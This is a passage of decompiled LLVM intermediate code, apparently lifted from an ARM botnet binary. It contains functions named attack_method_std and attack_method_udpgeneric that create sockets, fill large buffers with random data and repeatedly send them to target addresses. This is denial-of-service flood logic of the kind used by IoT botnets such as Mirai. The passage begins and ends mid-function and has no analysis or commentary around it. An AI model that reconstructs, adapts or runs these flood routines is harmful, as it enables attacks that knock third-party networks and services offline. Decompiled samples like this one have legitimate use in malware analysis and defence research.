  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v0_8a7c12 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i16* %stack_var_-56 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb53, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i16 2, i16* %stack_var_-56, align 2
  %v7_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16, i32 2, i32 2)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb53

bb53:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b98 = and i32 %v0_8b8c, 65280
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v5_8ba4 = call i32 @llvm.bswap.i32(i32 %v0_8b8c)
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1824 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c12, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1824, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1823 = phi i32 [ %v1_8c1824, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1823, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8a50, { 1, 0 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i16* %stack_var_-56, { 3, 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v0_8d28 = call i32 @rand_next()
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v0_8d1c12 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i16* %stack_var_-56 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb53, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i16 2, i16* %stack_var_-56, align 2
  %v7_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16, i32 2, i32 2)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb53

bb53:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e38 = and i32 %v0_8e2c, 65280
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v5_8e44 = call i32 @llvm.bswap.i32(i32 %v0_8e2c)
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb824 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c12, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb824, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb823 = phi i32 [ %v1_8eb824, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb823, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8cf0, { 1, 0 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i16* %stack_var_-56, { 3, 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eec = load i32, i32* @sb, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
